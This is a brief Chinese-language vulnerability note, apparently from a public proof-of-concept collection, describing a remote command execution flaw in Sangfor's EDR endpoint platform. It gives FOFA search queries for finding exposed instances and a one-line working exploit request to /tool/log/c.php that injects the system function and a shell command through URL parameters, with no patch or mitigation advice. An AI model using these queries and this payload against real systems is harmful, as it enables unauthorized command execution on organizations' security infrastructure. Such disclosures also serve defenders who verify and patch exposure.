# 深信服EDR平台存在远程命令执行漏洞

# 一、漏洞简介
 深信服终端检测响应平台EDR,通过云网端联动协同、威胁情报共享、多层级响应机制,帮助用户快速处置终端安全问题,构建轻量级、智能化、响应快的下一代终端安全系统。深信服终端监测响应平台（EDR）存在远程命令执行漏洞。

# 二、影响版本
+ 深信服EDR

# 三、资产测绘
+ fofa`<font style="color:rgba(0, 0, 0, 0.9);">app="SANGFOR-EDR"</font>``<font style="color:rgba(0, 0, 0, 0.9);">title="终端检测响应平台"</font>`


# 四、漏洞复现
```plain
/tool/log/c.php?strip_slashes=system&host=id
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bw1hyzgtaebgmp4x>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
